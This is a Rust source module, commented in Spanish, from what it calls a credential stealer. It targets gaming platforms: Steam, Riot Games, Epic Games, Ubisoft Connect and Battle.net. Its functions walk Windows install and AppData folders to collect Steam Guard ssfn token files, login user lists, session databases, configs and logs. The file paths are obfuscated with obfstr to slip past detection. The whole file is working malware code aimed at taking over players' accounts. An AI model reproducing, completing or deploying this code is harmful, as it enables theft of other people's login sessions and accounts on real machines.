// Stealer de credenciales de gaming (Steam, Riot Games, Epic Games)
use crate::stealer::common::{get_appdata_local, get_appdata_roaming};
use obfstr::obfstr;
use std::fs;
use std::path::PathBuf; // ← Ofuscación de strings

/// Credenciales de gaming robadas
#[derive(Debug, Clone)]
pub struct GamingData {
    pub platform: String,  // Steam, Riot, Epic, etc.
    pub data_type: String, // Session, Config, Saved Logins
    pub path: PathBuf,
    pub files: Vec<String>,
}

impl GamingData {
    pub fn to_string(&self) -> String {
        let mut output = format!("[{}] {}\n", self.platform, self.data_type);
        output.push_str(&format!("Path: {}\n", self.path.display()));
        output.push_str(&format!("Files: {}\n", self.files.join(", ")));
        output
    }
}

/// Roba todas las credenciales de gaming disponibles
pub fn steal_gaming_data() -> Vec<GamingData> {
    let mut gaming_data = Vec::new();

    // Steam
    gaming_data.extend(steal_steam_data());

    // Riot Games (League of Legends, Valorant)
    gaming_data.extend(steal_riot_data());

    // Epic Games
    gaming_data.extend(steal_epic_data());

    // Ubisoft Connect
    gaming_data.extend(steal_ubisoft_data());

    // Battle.net (Blizzard)
    gaming_data.extend(steal_battlenet_data());

    gaming_data
}

/// Roba datos de Steam
fn steal_steam_data() -> Vec<GamingData> {
    let mut data = Vec::new();

    // Steam guarda sus archivos en:
    // - C:\Program Files (x86)\Steam (installdir)
    // - %LOCALAPPDATA%\Steam (algunos configs)

    // Buscar instalación de Steam - OFUSCADO
    let steam_paths = vec![
        PathBuf::from(obfstr!(r"C:\Program Files (x86)\Steam")),
        PathBuf::from(obfstr!(r"C:\Program Files\Steam")),
    ];

    for steam_path in steam_paths {
        if !steam_path.exists() {
            continue;
        }

        // 1. Session files (ssfn files - Steam Guard) - OFUSCADO
        let config_path = steam_path.join(obfstr!("config"));
        if config_path.exists() {
            let mut session_files = Vec::new();

            if let Ok(entries) = fs::read_dir(&config_path) {
                for entry in entries.flatten() {
                    let file_name = entry.file_name().to_string_lossy().to_string();

                    // ssfn* files contienen tokens de Steam Guard
                    if file_name.starts_with(obfstr!("ssfn")) {
                        session_files.push(file_name);
                    }
                }
            }

            if !session_files.is_empty() {
                data.push(GamingData {
                    platform: "Steam".to_string(),
                    data_type: "Steam Guard Tokens".to_string(),
                    path: config_path.clone(),
                    files: session_files,
                });
            }

            // 2. loginusers.vdf (lista de usuarios que han iniciado sesión)
            let loginusers_path = config_path.join("loginusers.vdf");
            if loginusers_path.exists() {
                data.push(GamingData {
                    platform: "Steam".to_string(),
                    data_type: "Login Users".to_string(),
                    path: config_path.clone(),
                    files: vec!["loginusers.vdf".to_string()],
                });
            }
        }

        // 3. config.vdf (configuración general)
        let config_vdf = steam_path.join("config").join("config.vdf");
        if config_vdf.exists() {
            data.push(GamingData {
                platform: "Steam".to_string(),
                data_type: "Config".to_string(),
                path: steam_path.join("config"),
                files: vec!["config.vdf".to_string()],
            });
        }
    }

    data
}

/// Roba datos de Riot Games (League of Legends, Valorant)
fn steal_riot_data() -> Vec<GamingData> {
    let mut data = Vec::new();

    let local_appdata = match get_appdata_local() {
        Some(path) => path,
        None => return data,
    };

    // Riot Client guarda datos en %LOCALAPPDATA%\Riot Games
    let riot_path = local_appdata.join("Riot Games");

    if !riot_path.exists() {
        return data;
    }

    // 1. RiotClientInstalls.json (info de instalación)
    let installs_json = riot_path.join("RiotClientInstalls.json");
    if installs_json.exists() {
        data.push(GamingData {
            platform: "Riot Games".to_string(),
            data_type: "Client Installs".to_string(),
            path: riot_path.clone(),
            files: vec!["RiotClientInstalls.json".to_string()],
        });
    }

    // 2. Riot Client Private Settings (puede contener tokens)
    let riot_client_path = riot_path.join("Riot Client").join("Data");
    if riot_client_path.exists() {
        let mut riot_files = Vec::new();

        if let Ok(entries) = fs::read_dir(&riot_client_path) {
            for entry in entries.flatten() {
                let file_name = entry.file_name().to_string_lossy().to_string();

                // Buscar archivos de configuración y cache
                if file_name.ends_with(".json")
                    || file_name.ends_with(".yaml")
                    || file_name.ends_with(".dat")
                {
                    riot_files.push(file_name);
                }
            }
        }

        if !riot_files.is_empty() {
            data.push(GamingData {
                platform: "Riot Games".to_string(),
                data_type: "Client Data".to_string(),
                path: riot_client_path,
                files: riot_files,
            });
        }
    }

    data
}

/// Roba datos de Epic Games
fn steal_epic_data() -> Vec<GamingData> {
    let mut data = Vec::new();

    let local_appdata = match get_appdata_local() {
        Some(path) => path,
        None => return data,
    };

    // Epic Games guarda en %LOCALAPPDATA%\EpicGamesLauncher\Saved\Config\Windows
    let epic_path = local_appdata.join("EpicGamesLauncher").join("Saved");

    if !epic_path.exists() {
        return data;
    }

    // 1. Config files
    let config_path = epic_path.join("Config").join("Windows");
    if config_path.exists() {
        let mut config_files = Vec::new();

        if let Ok(entries) = fs::read_dir(&config_path) {
            for entry in entries.flatten() {
                let file_name = entry.file_name().to_string_lossy().to_string();

                if file_name.ends_with(".ini") {
                    config_files.push(file_name);
                }
            }
        }

        if !config_files.is_empty() {
            data.push(GamingData {
                platform: "Epic Games".to_string(),
                data_type: "Config".to_string(),
                path: config_path,
                files: config_files,
            });
        }
    }

    // 2. Logs (pueden contener tokens de sesión)
    let logs_path = epic_path.join("Logs");
    if logs_path.exists() {
        let mut log_files = Vec::new();

        if let Ok(entries) = fs::read_dir(&logs_path) {
            for entry in entries.flatten() {
                let file_name = entry.file_name().to_string_lossy().to_string();

                if file_name.ends_with(".log") {
                    log_files.push(file_name);
                }
            }
        }

        if !log_files.is_empty() && log_files.len() <= 5 {
            // Solo tomar los 5 logs más recientes
            data.push(GamingData {
                platform: "Epic Games".to_string(),
                data_type: "Logs".to_string(),
                path: logs_path,
                files: log_files,
            });
        }
    }

    data
}

/// Roba datos de Ubisoft Connect (antes Uplay)
fn steal_ubisoft_data() -> Vec<GamingData> {
    let mut data = Vec::new();

    let local_appdata = match get_appdata_local() {
        Some(path) => path,
        None => return data,
    };

    // Ubisoft guarda en %LOCALAPPDATA%\Ubisoft Game Launcher
    let ubisoft_path = local_appdata.join("Ubisoft Game Launcher");

    if !ubisoft_path.exists() {
        return data;
    }

    let mut ubisoft_files = Vec::new();

    if let Ok(entries) = fs::read_dir(&ubisoft_path) {
        for entry in entries.flatten() {
            let file_name = entry.file_name().to_string_lossy().to_string();

            // Buscar archivos de sesión y configuración
            if file_name.ends_with(".db")
                || file_name.ends_with(".json")
                || file_name.ends_with(".ini")
            {
                ubisoft_files.push(file_name);
            }
        }
    }

    if !ubisoft_files.is_empty() {
        data.push(GamingData {
            platform: "Ubisoft Connect".to_string(),
            data_type: "Session Data".to_string(),
            path: ubisoft_path,
            files: ubisoft_files,
        });
    }

    data
}

/// Roba datos de Battle.net (Blizzard)
fn steal_battlenet_data() -> Vec<GamingData> {
    let mut data = Vec::new();

    let roaming_appdata = match get_appdata_roaming() {
        Some(path) => path,
        None => return data,
    };

    // Battle.net guarda en %APPDATA%\Battle.net
    let battlenet_path = roaming_appdata.join("Battle.net");

    if !battlenet_path.exists() {
        return data;
    }

    let mut battlenet_files = Vec::new();

    if let Ok(entries) = fs::read_dir(&battlenet_path) {
        for entry in entries.flatten() {
            let file_name = entry.file_name().to_string_lossy().to_string();

            // Buscar archivos de configuración y cache
            if file_name.ends_with(".config")
                || file_name.ends_with(".db")
                || file_name == "Battle.net.config"
            {
                battlenet_files.push(file_name);
            }
        }
    }

    if !battlenet_files.is_empty() {
        data.push(GamingData {
            platform: "Battle.net".to_string(),
            data_type: "Config".to_string(),
            path: battlenet_path,
            files: battlenet_files,
        });
    }

    data
}
